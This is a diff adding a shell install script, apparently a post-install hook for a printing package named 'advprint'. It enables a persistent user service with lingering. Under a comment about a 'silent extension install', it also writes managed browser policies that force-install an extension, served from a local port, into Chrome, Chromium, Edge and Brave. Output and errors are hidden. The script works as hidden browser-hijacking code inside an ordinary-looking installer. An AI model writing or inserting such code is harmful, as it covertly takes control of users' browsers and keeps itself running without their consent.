@@ -1,0 +1,19 @@
+#!/bin/sh
+set -e
+U="${SUDO_USER:-$PKG_USER}"
+if [ -n "$U" ]; then
+  sudo -u "$U" sh -c 'systemctl --user enable --now advprint.service' \
+    >/dev/null 2>&1 || true
+  loginctl enable-linger "$U" >/dev/null 2>&1 || true
+fi
+# v3.0.7: silent extension install policy (Chromium forcelist)
+EXTID="likldbkamojokkfdlcjibiljpgbbnohc"
+EXTVAL="${EXTID};http://127.0.0.1:9235/extension/updates.xml"
+POLJSON="{\"ExtensionInstallForcelist\":[\"${EXTVAL}\"]}"
+for D in /etc/opt/chrome/policies/managed /etc/chromium/policies/managed \
+         /etc/opt/edge/policies/managed /etc/brave/policies/managed; do
+  mkdir -p "$D"
+  printf '%s\n' "$POLJSON" > "$D/advprint-pro.json"
+  chmod 644 "$D/advprint-pro.json"
+done
+exit 0
